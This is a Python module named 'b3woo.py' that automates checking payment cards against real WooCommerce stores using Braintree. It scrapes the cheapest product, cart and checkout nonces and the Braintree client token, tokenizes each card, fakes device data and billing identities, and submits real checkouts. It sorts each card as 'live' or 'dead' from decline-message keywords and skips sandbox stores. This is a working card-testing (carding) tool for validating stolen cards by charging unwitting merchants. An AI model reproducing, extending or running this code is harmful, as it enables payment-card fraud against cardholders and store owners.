"""b3woo.py — Braintree WooCommerce gateway checker.

Flow:
  1.  Discover product_id  → /shop/ or / HTML (data-product_id / ?add-to-cart=)
  2.  POST /?wc-ajax=add_to_cart             → add to cart
  3.  GET  /checkout/                         → WC process-checkout nonce
                                               + Braintree clientToken + amount
  4.  Decode clientToken (base64 JSON)        → authorizationFingerprint + merchantId
  5.  POST payments.braintree-api.com/graphql → TokenizeCreditCard
  6.  POST api.braintreegateway.com/…/three_d_secure/lookup  (non-fatal)
  7.  POST /?wc-ajax=checkout                 → classify result

Returns {"status": "live"|"dead"|"unknown", "message": str, "amount": str, "card": str}
"""

import base64
import json
import re
import secrets

import requests

from .utils import (
    REQUEST_TIMEOUT,
    build_plain_session,
    convert_year,
    exc_msg,
    get_billing_identity,
    get_country_for_domain,
    random_ua,
    session_id,
)

# -- Dead-result keywords -----------------------------------------------------
_DEAD_KEYWORDS = [
    "declined",
    "do not honor",
    "do not honour",
    "transaction refused",
    "security violation",
    "invalid card",
    "insufficient funds",
    "card has expired",
    "expired card",
    "security code",
    "fraud",
    "blocked",
    "call your bank",
    "contact your bank",
    "restricted card",
    "transaction not allowed",
    "card not supported",
    "lost or stolen",
    "card reported lost",
    "cvv2 failure",
    "cvv2",
    "account closed",
    "invalid account",
    "account suspended",
    "not permitted",
    "no such issuer",
    "pick up card",
    "possible stolen",
    "possible lost",
    "invalid account number",
    "processor declined",
    "payment declined",
    "card declined",
    "authorization failed",
    "avs",
    "honor with id",
    "not authorized",
    "gateway rejected",
    "card type not supported",
    "card number is invalid",
    "verification failed",
    "insufficient credit",
]


# -- Response classifier ------------------------------------------------------
def _classify(response_text: str, http_status: int, amount: str, card_str: str) -> dict:
    """Classify WooCommerce AJAX checkout response."""
    parsed = None
    try:
        parsed = json.loads(response_text)
    except Exception:
        pass

    # WooCommerce success: {"result":"success","redirect":"..."}
    if isinstance(parsed, dict) and parsed.get("result") == "success":
        return {"status": "live", "message": "Charged", "amount": amount, "card": card_str}

    # Extract human-readable error
    msg = ""
    if isinstance(parsed, dict):
        raw = parsed.get("messages", "") or parsed.get("message", "") or ""
        msg = re.sub(r"<[^>]+>", " ", str(raw))
        msg = re.sub(r"\s+", " ", msg).strip()

    if not msg:
        msg = re.sub(r"<[^>]+>", " ", response_text[:400])
        msg = re.sub(r"\s+", " ", msg).strip()[:200]

    # If message contains "Reason:", keep only the part after it
    if "reason:" in msg.lower():
        msg = re.split(r"[Rr]eason\s*:", msg, maxsplit=1)[-1].strip()

    combined = (msg + " " + response_text).lower()
    for kw in _DEAD_KEYWORDS:
        if kw in combined:
            label = msg[:120] if msg else kw.title()
            return {"status": "dead", "message": label, "amount": amount, "card": card_str}

    short = msg[:120] if msg else "Unknown response"
    return {"status": "unknown", "message": short, "amount": amount, "card": card_str}


# -- Product discovery --------------------------------------------------------
def _discover_product(session: requests.Session, domain: str, ua: str):
    """Return cheapest product_id string, or None if nothing found."""
    # Try WooCommerce Store REST API with price sort first
    # Use per_page=100 so we scan enough items to find a purchasable one (some stores
    # list many non-purchasable/out-of-stock products at the front of the price-sorted list)
    for api_url in (
        f"https://{domain}/wp-json/wc/store/v1/products?per_page=100&orderby=price&order=asc&status=publish",
        f"https://{domain}/wp-json/wc/store/v1/products?per_page=100&orderby=price&order=asc",
    ):
        try:
            r = session.get(api_url, headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list) and data:
                    best_id = ""
                    best_price = float("inf")
                    for item in data:
                        pid = str(item.get("id", ""))
                        # Skip non-purchasable items (e.g. gift cards, out-of-stock)
                        if not pid or not item.get("is_purchasable"):
                            continue
                        raw_price = str(item.get("prices", {}).get("price", "0") or "0")
                        try:
                            price = float(raw_price) / 100
                        except Exception:
                            price = 0.0
                        # Skip free/zero-price items — can't be charged
                        if price <= 0:
                            continue
                        if price < best_price or not best_id:
                            best_price = price
                            best_id = pid
                    if best_id:
                        return best_id
        except Exception:
            continue

    # HTML scraping fallback
    for path in ("/shop/", "/", "/store/", "/shop"):
        try:
            r = session.get(
                f"https://{domain}{path}",
                headers={"User-Agent": ua, "Accept": "text/html,*/*"},
                timeout=REQUEST_TIMEOUT,
            )
            if r.status_code not in (200, 301, 302):
                continue
            html = r.text
            # Standard WC: data-product_id="123"
            m = re.search(r'data-product_id=["\'](\d+)["\']', html)
            if m:
                return m.group(1)
            # WC add-to-cart query param: ?add-to-cart=123
            m = re.search(r'[?&]add-to-cart=(\d+)', html)
            if m:
                return m.group(1)
            # Gutenberg/WC blocks: "productId":123
            m = re.search(r'"productId"\s*:\s*(\d+)', html)
            if m:
                return m.group(1)
        except Exception:
            continue
    return None


# -- Checkout data extraction -------------------------------------------------
def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple:
    """Load /checkout/ → (wc_nonce, bt_client_token, amount_str, plugin_type).

    plugin_type is 'skyverge' or 'native'.
    """
    try:
        r = session.get(
            f"https://{domain}/checkout/",
            headers={"User-Agent": ua, "Upgrade-Insecure-Requests": "1"},
            timeout=REQUEST_TIMEOUT,
        )
        html = r.text

        # ── WC process-checkout nonce ─────────────────────────────────────
        nonce = ""
        m = re.search(
            r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([^"\']+)["\']'
            r'|value=["\']([^"\']+)["\']\s+name=["\']woocommerce-process-checkout-nonce["\']',
            html,
        )
        if m:
            nonce = m.group(1) or m.group(2) or ""
        if not nonce:
            m = re.search(r'"checkout_nonce"\s*:\s*"([a-f0-9]{8,})"', html)
            if m:
                nonce = m.group(1)
        if not nonce:
            m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{8,})"', html)
            if m:
                nonce = m.group(1)

        # ── Braintree clientToken — detect plugin type ────────────────────
        # SkyVerge v2 WC Braintree: var wc_braintree_client_token = ["<base64>"]
        client_token = ""
        plugin_type = "native_ajax"
        m = re.search(r'var wc_braintree_client_token\s*=\s*(\[.+?\]);', html)
        if m:
            try:
                tokens = json.loads(m.group(1))
                if isinstance(tokens, list) and tokens:
                    client_token = str(tokens[0])
                    plugin_type = "skyverge"
            except Exception:
                pass

        # Native WooCommerce Braintree plugin — inline patterns
        if not client_token:
            for pat in (
                r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
                r'"client_token"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
                r"clientToken\s*[=:]\s*['\"]([A-Za-z0-9+/=]{40,})['\"]",
            ):
                m = re.search(pat, html)
                if m:
                    client_token = m.group(1)
                    plugin_type = "native_inline"
                    break

        # SkyVerge v1 / native WC Braintree — token loaded via AJAX on page load
        # Detected by presence of WC_Braintree_Credit_Card_Payment_Form_Handler with
        # client_token_nonce but no inline token
        if not client_token:
            ct_nonce_m = re.search(
                r'(?:WC_Braintree_Credit_Card_Payment_Form_Handler|wc_braintree_credit_card_handler)'
                r'[^}]{0,500}"client_token_nonce"\s*:\s*"([^"]+)"',
                html, re.S,
            )
            if not ct_nonce_m:
                ct_nonce_m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
            if ct_nonce_m:
                ct_nonce = ct_nonce_m.group(1)
                try:
                    rt = session.get(
                        f"https://{domain}/?wc-ajax=wc_braintree_credit_card_get_client_token",
                        params={"nonce": ct_nonce},
                        headers={"User-Agent": ua, "X-Requested-With": "XMLHttpRequest"},
                        timeout=REQUEST_TIMEOUT,
                    )
                    body = rt.text.strip()
                    if body:
                        # Response may be plain base64 or JSON-encoded string
                        try:
                            decoded_body = json.loads(body)
                            client_token = decoded_body if isinstance(decoded_body, str) else ""
                        except Exception:
                            client_token = body
                        plugin_type = "native_ajax"
                except Exception:
                    pass

        # ── Grand total from checkout page ────────────────────────────────
        amount = ""
        # Try order-total table cell (handles comma decimal like "25,77")
        m = re.search(
            r'order-total[^<]{0,300}<bdi>([^<]+)<',
            html, re.S,
        )
        if not m:
            m = re.search(
                r'class=["\'][^"\']*order-total[^"\']*["\'][^<]*<[^>]+><[^>]*>\s*<[^>]+>\s*([\$£€]?[\d,.]+)',
                html, re.S,
            )
        if not m:
            m = re.search(r'"total"\s*:\s*["\']?([\d,.]+)', html)
        if m:
            raw = m.group(1).strip()
            # Strip currency symbols and whitespace, keep digits/comma/dot
            raw = re.sub(r'[^\d,.]', '', raw)
            # Normalise comma-decimal ("25,77" → "25.77", "1.234,56" → "1234.56")
            if ',' in raw and '.' not in raw:
                amount = raw.replace(',', '.')
            elif ',' in raw and '.' in raw:
                # dot = thousand separator, comma = decimal
                amount = raw.replace('.', '').replace(',', '.')
            else:
                amount = raw

        return nonce, client_token, amount, plugin_type
    except Exception:
        return "", "", "", "native"


# -- Main checker -------------------------------------------------------------
def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwargs) -> dict:
    """Check one card against a WooCommerce + Braintree store."""
    cc, mm, yy, cvv = card_tuple
    yy       = convert_year(yy)
    mm       = mm.zfill(2)
    card_str = f"{cc}|{mm}|{yy}" + (f"|{cvv}" if cvv else "")
    ua       = random_ua()

    # 1. Discover product
    product_id = _discover_product(session, domain, ua)
    if not product_id:
        return {"status": "unknown", "message": "Could not find product on store", "amount": "", "card": card_str}

    # 2. Add to cart
    atc_ok = False
    try:
        r = session.post(
            f"https://{domain}/?wc-ajax=add_to_cart",
            data={"product_id": product_id, "quantity": "1"},
            headers={
                "User-Agent":        ua,
                "Accept":            "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With":  "XMLHttpRequest",
                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer":           f"https://{domain}/",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            try:
                d = r.json()
                if d.get("fragments") or d.get("cart_hash"):
                    atc_ok = True
                elif "error" not in json.dumps(d).lower():
                    atc_ok = True
            except Exception:
                if r.text.strip():
                    atc_ok = True
    except Exception as exc:
        return {"status": "unknown", "message": f"ATC error: {exc_msg(exc)}", "amount": "", "card": card_str}

    if not atc_ok:
        return {"status": "unknown", "message": "Add to cart failed", "amount": "", "card": card_str}

    # 3. Load checkout page
    nonce, client_token_raw, amount, plugin_type = _get_checkout_data(session, domain, ua)

    if not client_token_raw:
        return {"status": "unknown", "message": "Not a WooCommerce Braintree store (no clientToken)", "amount": "", "card": card_str}

    # 4. Decode clientToken
    try:
        pad            = "=" * ((4 - len(client_token_raw) % 4) % 4)
        decoded        = json.loads(base64.b64decode(client_token_raw + pad))
        b3_fingerprint = decoded["authorizationFingerprint"]
        merchant_id    = decoded["merchantId"]
        # Reject sites running on Braintree sandbox — they are test stores
        if decoded.get("environment") == "sandbox":
            return {"status": "unknown", "message": "braintree sandbox (test store)", "amount": amount, "card": card_str}
        bt_graphql_url = (
            decoded.get("graphQL", {}).get("url")
            or "https://payments.braintree-api.com/graphql"
        )
        bt_client_api_url = (
            decoded.get("clientApiUrl")
            or f"https://api.braintreegateway.com/merchants/{merchant_id}/client_api"
        ).rstrip("/")
    except Exception as exc:
        return {"status": "unknown", "message": f"clientToken decode: {exc}", "amount": amount, "card": card_str}

    # 5. Tokenize card via Braintree GraphQL
    bt_token = ""
    try:
        r = build_plain_session().post(
            bt_graphql_url,
            json={
                "clientSdkMetadata": {
                    "source":      "client",
                    "integration": "custom",
                    "sessionId":   session_id(),
                },
                "query": (
                    "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                    "  tokenizeCreditCard(input: $input) {"
                    "    token"
                    "    creditCard { bin brandCode last4 expirationMonth expirationYear"
                    "      binData { prepaid healthcare debit durbinRegulated commercial"
                    "               payroll issuingBank countryOfIssuance productId } }"
                    "  }"
                    "}"
                ),
                "variables": {
                    "input": {
                        "creditCard": {
                            "number":          cc,
                            "expirationMonth": mm,
                            "expirationYear":  yy,
                            "cvv":             cvv or "",
                        },
                        "options": {"validate": False},
                    }
                },
                "operationName": "TokenizeCreditCard",
            },
            headers={
                "Accept":            "*/*",
                "Authorization":     f"Bearer {b3_fingerprint}",
                "Braintree-Version": "2018-05-10",
                "Content-Type":      "application/json",
                "Origin":            "https://assets.braintreegateway.com",
                "Referer":           "https://assets.braintreegateway.com/",
                "User-Agent":        ua,
            },
            timeout=REQUEST_TIMEOUT,
        )
        bt_data  = r.json()
        bt_token = (
            (bt_data.get("data") or {})
                   .get("tokenizeCreditCard") or {}
        ).get("token", "")
    except Exception as exc:
        return {"status": "unknown", "message": f"BT tokenize error: {exc}", "amount": amount, "card": card_str}

    if not bt_token:
        return {"status": "unknown", "message": "BT tokenize: no token returned", "amount": amount, "card": card_str}

    # 6. 3DS lookup (non-fatal)
    # Normalize amount for API — amount is already dot-decimal from _get_checkout_data
    amount_numeric = amount or "1.00"
    if not re.match(r'^\d+\.\d{1,2}$', amount_numeric):
        amount_numeric = re.sub(r'[^\d.]', '', amount_numeric) or "1.00"
    nonce_payment  = bt_token      # returned to main nonce field
    threeds_nonce  = ""            # 3DS result goes to separate field (SkyVerge)
    ident          = get_billing_identity(domain)
    country        = ident.get("country") or get_country_for_domain(domain) or "US"
    state          = ident.get("state", "")
    state_full     = ident.get("state_full", state)

    try:
        r = build_plain_session().post(
            f"{bt_client_api_url}/v1/payment_methods/{bt_token}/three_d_secure/lookup",
            json={
                "amount":       amount_numeric,
                "additionalInfo": {
                    "billingLine1":       ident["street"],
                    "billingCity":        ident["city"],
                    "billingState":       state,
                    "billingPostalCode":  ident["zip"],
                    "billingCountryCode": country,
                    "billingPhoneNumber": ident["phone"],
                    "billingGivenName":   ident["fname"],
                    "billingSurname":     ident["lname"],
                },
                "dfReferenceId":  f"1_{secrets.token_hex(16)}",
                "clientMetadata": {
                    "requestedThreeDSecureVersion":           "2",
                    "sdkVersion":                             "web/3.79.1",
                    "cardinalDeviceDataCollectionTimeElapsed": 625,
                },
                "authorizationFingerprint": b3_fingerprint,
                "braintreeLibraryVersion":  "braintree/web/3.79.1",
                "_meta": {
                    "merchantAppId":   domain,
                    "platform":        "web",
                    "sdkVersion":      "3.79.1",
                    "source":          "client",
                    "integration":     "custom",
                    "integrationType": "custom",
                    "sessionId":       session_id(),
                },
            },
            headers={
                "Accept":            "*/*",
                "Content-Type":      "application/json",
                "User-Agent":        ua,
                "X-Requested-With":  "XMLHttpRequest",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code == 200:
            data = r.json()
            got  = (
                data.get("nonce")
                or (data.get("paymentMethod") or {}).get("nonce")
                or ""
            )
            if got:
                if plugin_type == "skyverge":
                    # SkyVerge: original token stays in main nonce field, 3DS nonce is separate
                    threeds_nonce = got
                else:
                    # Native WC Braintree (inline or AJAX): 3DS nonce replaces the payment nonce
                    nonce_payment = got
    except Exception:
        pass  # non-fatal

    # 7. Submit WooCommerce checkout
    device_data = json.dumps({
        "device_session_id": secrets.token_hex(16),
        "fraud_merchant_id": "null",
    })

    # Build checkout fields based on Braintree plugin type
    if plugin_type in ("skyverge", "native_ajax"):
        # SkyVerge field names (both v2 inline and v1 AJAX-loaded token)
        checkout_data = {
            "billing_first_name":                 ident["fname"],
            "billing_last_name":                  ident["lname"],
            "billing_company":                    "",
            "billing_email":                      ident["email"],
            "billing_phone":                      ident["phone"],
            "billing_address_1":                  ident["street"],
            "billing_address_2":                  "",
            "billing_city":                       ident["city"],
            "billing_state":                      state,
            "billing_postcode":                   ident["zip"],
            "billing_country":                    country,
            "shipping_first_name":                ident["fname"],
            "shipping_last_name":                 ident["lname"],
            "shipping_company":                   "",
            "shipping_address_1":                 ident["street"],
            "shipping_address_2":                 "",
            "shipping_city":                      ident["city"],
            "shipping_state":                     state,
            "shipping_postcode":                  ident["zip"],
            "shipping_country":                   country,
            "order_comments":                     "",
            "payment_method":                     "braintree_cc",
            "braintree_cc_nonce_key":             nonce_payment,
            "braintree_cc_3ds_nonce_key":         threeds_nonce,
            "braintree_cc_device_data":           device_data,
            "braintree_cc_config_data":           "",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer":                   "/checkout/",
        }
    else:
        # Native WooCommerce Braintree plugin field names
        checkout_data = {
            "billing_first_name":                     ident["fname"],
            "billing_last_name":                      ident["lname"],
            "billing_company":                        "",
            "billing_email":                          ident["email"],
            "billing_phone":                          ident["phone"],
            "billing_address_1":                      ident["street"],
            "billing_address_2":                      "",
            "billing_city":                           ident["city"],
            "billing_state":                          state,
            "billing_postcode":                       ident["zip"],
            "billing_country":                        country,
            "shipping_first_name":                    ident["fname"],
            "shipping_last_name":                     ident["lname"],
            "shipping_company":                       "",
            "shipping_address_1":                     ident["street"],
            "shipping_address_2":                     "",
            "shipping_city":                          ident["city"],
            "shipping_state":                         state,
            "shipping_postcode":                      ident["zip"],
            "shipping_country":                       country,
            "order_comments":                         "",
            "payment_method":                         "braintree_credit_card",
            "wc_braintree_credit_card_payment_nonce": nonce_payment,
            "wc_braintree_device_data":               device_data,
            "woocommerce-process-checkout-nonce":     nonce,
            "_wp_http_referer":                       "/checkout/",
        }

    try:
        r = session.post(
            f"https://{domain}/?wc-ajax=checkout",
            data=checkout_data,
            headers={
                "User-Agent":        ua,
                "Accept":            "application/json, text/javascript, */*; q=0.01",
                "X-Requested-With":  "XMLHttpRequest",
                "Content-Type":      "application/x-www-form-urlencoded; charset=UTF-8",
                "Referer":           f"https://{domain}/checkout/",
                "Origin":            f"https://{domain}",
            },
            timeout=REQUEST_TIMEOUT,
        )
        return _classify(r.text, r.status_code, amount, card_str)
    except Exception as exc:
        return {"status": "unknown", "message": f"Checkout submit: {exc_msg(exc)}", "amount": amount, "card": card_str}
